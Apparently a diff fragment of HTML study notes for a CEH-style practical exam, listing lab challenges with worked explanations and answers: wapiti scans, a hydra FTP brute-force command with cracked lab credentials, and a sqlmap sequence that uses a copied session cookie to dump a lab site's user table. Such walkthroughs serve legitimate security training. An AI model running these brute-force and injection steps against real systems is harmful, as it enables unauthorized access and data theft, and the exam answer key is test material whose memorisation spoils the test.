+</p><p id="2813addf-00cb-804b-a502-dc3f9b464bb4" class="">Explanation:<div class="indented"><p id="2813addf-00cb-803e-8801-d87960c88c22" class="">Run wapiti again against target website </p><p id="2813addf-00cb-80a8-8413-c2fd06934c8e" class="">Follow above steps and view the .html → Can see security policies missing to prevent XSS</p></div></p><p id="2813addf-00cb-80d0-99e6-ebcff0e46005" class="">Answer: <div class="indented"><p id="2813addf-00cb-8003-916f-e4571b6e2db1" class="">Content Security Policy </p></div></p><p id="2813addf-00cb-8017-b7bf-c4dcb3d43684" class="">
+</p><ol type="1" id="2813addf-00cb-806c-93ac-eea26aa47dd2" class="numbered-list" start="11"><li>As part of an internal vulnerability assessment, a potentially misconfigured website was identified within the organization&#x27;s network. A security scan was conducted using smart scanner tool, and the resulting report w_report.pdf was stored on a Windows Server 2019 machine within the 192.168.10.0/24 subnet. Your objective is to access the target server, retrieve the scan report, and analyze its contents to determine the total number of directory listing entries identified on the scanned website. (Format: NN)</li></ol><p id="2813addf-00cb-8078-98c6-ec33e3dfb024" class="">Explanation: <div class="indented"><p id="2813addf-00cb-80dd-aaff-c13d71c89b20" class="">.144 is the Windows 2019 Server</p><p id="2813addf-00cb-801f-89d9-fe28b8b68d40" class="">FTP is open</p><p id="2813addf-00cb-809f-919a-e546b55e642a" class=""><em><strong>hydra -L username.txt -P password.txt 192.168.10.144 ftp </strong></em></p><p id="2813addf-00cb-8057-a1c2-ee6f97887a77" class="">UN/PW = Parker/Passw0rd@1234</p></div></p><p id="2813addf-00cb-80e7-9ab3-f2793e63ba97" class="">
+</p><p id="2813addf-00cb-8076-a511-c9588b95861d" class="">Answer: </p><p id="2813addf-00cb-80a9-a122-dd9461f7f0c9" class="">
+</p><ol type="1" id="2813addf-00cb-8098-83c8-dbd17e207f20" class="numbered-list" start="12"><li>Perform a bruteforce attack on www.cehorg.com and find the password of user adam. (Format: aaaaaaNNNN)</li></ol><p id="2813addf-00cb-8068-9815-d0c3407fcc68" class="">
+</p><p id="2813addf-00cb-80dd-b120-ed83fda7183e" class="">Explanation:</p><p id="2813addf-00cb-805f-9212-ca1d4bbea4fe" class="">
+</p><p id="2813addf-00cb-8051-b9b7-d4437ab2bf7b" class=""><br/>Answer:</p><p id="2813addf-00cb-80d0-be41-ff82f8eaec16" class="">
+</p><ol type="1" id="2813addf-00cb-80d8-be46-ddfd24b311ab" class="numbered-list" start="13"><li>As a cybersecurity analyst, your task is to identify potential vulnerabilities on the moviescope.com website. Your manager has requested a specific number of risk categories. The required HTML file is located on EH Workstation 1. (Format: N)</li></ol><p id="2813addf-00cb-80ee-9c02-c6ead80d29b8" class="">Explanation:<div class="indented"><p id="2843addf-00cb-8067-8d40-e1fa9af7c460" class=""><em><strong>pip install wapiti3</strong></em></p><p id="2843addf-00cb-80a9-8255-cef10acf6c38" class=""><em><strong>wapiti -u https://&lt;targetwebsite&gt;</strong></em></p><p id="2843addf-00cb-8043-9873-f40303f8c171" class=""><em><strong>cd </strong></em>to generated report path (listed in output) </p><p id="2843addf-00cb-8015-97a8-f3d763b825ee" class=""><em><strong>cp </strong></em>file to /home/attacker/Desktop</p><p id="2843addf-00cb-80ab-a169-ded322814948" class="">Open with Firefox </p><p id="2843addf-00cb-80d0-a7d4-d77447aade71" class="">Add up Categories</p><p id="2843addf-00cb-8061-88b8-e8b550eecd37" class="">or open html file inside vidoes folder on Workstation1</p></div></p><p id="2813addf-00cb-80ad-affa-cc26a45cec9e" class=""><br/>Answer:<div class="indented"><p id="2813addf-00cb-8095-96e2-fccaf8aa3657" class="">3</p><p id="2843addf-00cb-8029-a941-f84c0e87ffb5" class="">
+</p></div></p><ol type="1" id="2813addf-00cb-8058-9a1c-dad7791cc1de" class="numbered-list" start="14"><li>Perform a SQL Injection attack on www.moviescope.com and find out the number of users available in the database. (Format: N)</li></ol><p id="2813addf-00cb-80b8-9f4a-f00df4a96e23" class="">Explanation:<div class="indented"><p id="2843addf-00cb-8045-a8bd-dbf37cc19d22" class="">Use credentials found in challenge 2 to login to web page</p><p id="2843addf-00cb-80cf-9a44-e7b62d9b3d5d" class="">Click profile → Note URL for later </p><p id="2843addf-00cb-809a-995c-ef9d71d8d8de" class="">Right click webpage → Inspect → Console tab → Copy users cookie (Entire string) </p><p id="2843addf-00cb-8022-8ea8-eab7d0396bc3" class=""><em><strong>sqlmap -u &quot;</strong></em><em><strong><a href="http://www.moviescope.com/viewprofile.aspx?id=1">http://www.moviescope.com/viewprofile.aspx?id=1</a></strong></em><em><strong>&quot; --cookie=&quot;[cookie value that you copied in Step#8]&quot; --dbs</strong></em></p><p id="2843addf-00cb-808c-af0c-ea03a12a06d1" class=""><em><strong>sqlmap -u &quot;</strong></em><em><strong><a href="http://www.moviescope.com/viewprofile.aspx?id=1">http://www.moviescope.com/viewprofile.aspx?id=1</a></strong></em><em><strong>&quot; --cookie=&quot;[cookie value which you have copied in Step#8]&quot; -D moviescope --tables</strong></em></p><p id="2843addf-00cb-802b-a2b1-c7f131f1b64c" class=""><em><strong>sqlmap -u &quot;</strong></em><em><strong><a href="http://www.moviescope.com/viewprofile.aspx?id=1">http://www.moviescope.com/viewprofile.aspx?id=1</a></strong></em><em><strong>&quot; --cookie=&quot;[cookie value which you have copied in Step#8]&quot; -D moviescope -T User_Login --dump</strong></em></p><p id="2813addf-00cb-80e2-870f-f627a5baaad6" class="">See 5 users</p></div></p><p id="2843addf-00cb-80cd-9d13-eb92cf71b08b" class="">
+</p><p id="2843addf-00cb-8062-9543-f1ee50750131" class="">Answer: <div class="indented"><p id="2843addf-00cb-80e9-a6c6-c1da2eb1e40b" class="">5</p><p id="2843addf-00cb-8081-bf34-efbe97a34ad7" class="">
+</p></div></p><ol type="1" id="2813addf-00cb-8024-b4f3-d748dd8f7886" class="numbered-list" start="15"><li>Perform a SQL Injection vulnerability scan on the target website www.moviescope.com and determine the WASC ID for SQL Injection (Format: NN)</li></ol><p id="2813addf-00cb-807a-abe8-c106bce3903d" class="">Explanation:<div class="indented"><p id="2843addf-00cb-80d3-9982-dc843b7a41ec" class="">ZAP 2.4 in Session Hijacking Directory</p><p id="2843addf-00cb-8092-be01-da5556d46709" class="">Scan and see WASC ID</p><p id="2843addf-00cb-805f-ba8e-f8d6761879ad" class="">or Google search</p></div></p><p id="2813addf-00cb-80e3-9bb1-f07004bf0671" class=""><br/>Answer:<div class="indented"><p id="2813addf-00cb-806a-bedc-cf0e2130795b" class="">19</p></div></p></div></article><span class="sans" style="font-size:14px;padding-top:2em"></span></body></html>
